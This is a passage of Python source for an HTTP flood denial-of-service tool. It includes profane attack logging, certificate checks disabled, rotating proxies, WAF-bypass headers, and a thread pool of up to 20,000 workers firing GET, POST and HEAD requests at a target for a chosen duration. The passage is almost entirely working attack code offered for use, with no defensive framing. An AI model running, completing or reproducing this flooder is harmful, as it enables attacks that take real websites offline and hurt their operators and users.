# ==================== COLORED LOGGING ====================
def log_attack(status="success", error_msg=""):
    global bot_counter, attack_method, target_ip, total_requests
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    with lock:
        bot_counter += 1
        total_requests += 1
        if status == "success":
            log_msg = f"{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.GREEN}FUCKING THE SERVER{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.MAGENTA}{attack_method}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.YELLOW}BOT#{bot_counter}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.CYAN}{target_ip}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.GREEN}STATUS: SUCCESS (RPS: {total_requests}){ColorLog.RESET}"
        elif status == "closed":
            log_msg = f"{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.GREEN}SERVER FUCKED UP!{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.MAGENTA}{attack_method}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.YELLOW}BOT#{bot_counter}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.CYAN}{target_ip}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.RED}CONNECTION CLOSED :) (RPS: {total_requests}){ColorLog.RESET}"
        else:
            log_msg = f"{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.YELLOW}{error_msg}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.MAGENTA}{attack_method}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.YELLOW}BOT#{bot_counter}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.CYAN}{target_ip}{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.RED}STATUS: NONE (RPS: {total_requests}){ColorLog.RESET}"
        sys.stdout.write("\r" + " " * 150 + "\r")
        sys.stdout.write(log_msg + "\n")
        sys.stdout.flush()

def log_init():
    global bot_counter, total_requests
    with lock:
        bot_counter = 0
        total_requests = 0
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    proxy_count = len(proxies_list)
    sys.stdout.write(f"{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.GREEN}INITIALIZING MAXIMUM RPS ATTACK...{ColorLog.RESET}\n")
    sys.stdout.write(f"{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.YELLOW}CPU CORES: {multiprocessing.cpu_count()} | PROXIES: {proxy_count} | SSL BYPASS: ACTIVATED{ColorLog.RESET}\n")
    sys.stdout.flush()

def log_complete():
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    sys.stdout.write(f"\n{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.GREEN}ATTACK COMPLETED!{ColorLog.RESET} \n")
    sys.stdout.write(f"{ColorLog.CYAN}[{timestamp}]{ColorLog.RESET} {ColorLog.RED}[CCT]{ColorLog.RESET} {ColorLog.WHITE}>{ColorLog.RESET} {ColorLog.YELLOW}Total Requests: {total_requests} | Total Bots: {bot_counter}{ColorLog.RESET}\n")
    sys.stdout.flush()

# ==================== SSL BYPASS CONTEXT ====================
def create_ssl_context():
    context = ssl_lib.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl_lib.CERT_NONE
    context.minimum_version = ssl_lib.TLSVersion.TLSv1
    context.maximum_version = ssl_lib.TLSVersion.TLSv1_3
    context.set_ciphers('DEFAULT@SECLEVEL=1')
    return context

# ==================== ATTACK CLASS ====================
class UltraFastAttacker:
    __slots__ = ['session', 'method_name', 'target_address', 'use_proxy']
    def __init__(self, method_name, target_address):
        self.session = requests.Session()
        self.method_name = method_name
        self.target_address = target_address
        self.use_proxy = len(proxies_list) > 0
        adapter = requests.adapters.HTTPAdapter(pool_connections=500, pool_maxsize=500, max_retries=0, pool_block=False)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.session.verify = False
    def attack(self, url, method="GET"):
        try:
            headers = get_waf_headers()
            proxy = get_random_proxy() if self.use_proxy else None
            if method == "GET":
                if proxy:
                    self.session.get(url, headers=headers, timeout=1, proxies=proxy)
                else:
                    self.session.get(url, headers=headers, timeout=1)
            elif method == "POST":
                fake_data = f"data={base64.b64encode(random.choice(useragents).encode()).decode()}"
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                if proxy:
                    self.session.post(url, headers=headers, data=fake_data, timeout=1, proxies=proxy)
                else:
                    self.session.post(url, headers=headers, data=fake_data, timeout=1)
            elif method == "HEAD":
                if proxy:
                    self.session.head(url, headers=headers, timeout=1, proxies=proxy)
                else:
                    self.session.head(url, headers=headers, timeout=1)
            log_attack("success")
            return True
        except (requests.exceptions.ConnectionError, socket.error, requests.exceptions.ReadTimeout):
            log_attack("closed")
            return False
        except Exception as e:
            log_attack("none", str(e)[:20])
            return False

def optimized_attack(url, duration, threads, method="GET", method_name=""):
    global attack_method, target_ip, attack_running, total_requests
    attack_method = method_name
    target_ip = urlparse(url).netloc
    end_time = time.time() + int(duration)
    thread_count = min(int(threads), 20000)
    attack_running = True
    log_init()
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        attackers = [UltraFastAttacker(method_name, target_ip) for _ in range(min(thread_count, 5000))]
        futures = []
        while time.time() < end_time and attack_running:
            for attacker in attackers:
                futures.append(executor.submit(attacker.attack, url, method))
            for future in futures[:200]:
                try:
                    future.result(timeout=0.005)
                except:
                    pass
            futures.clear()
    log_complete()

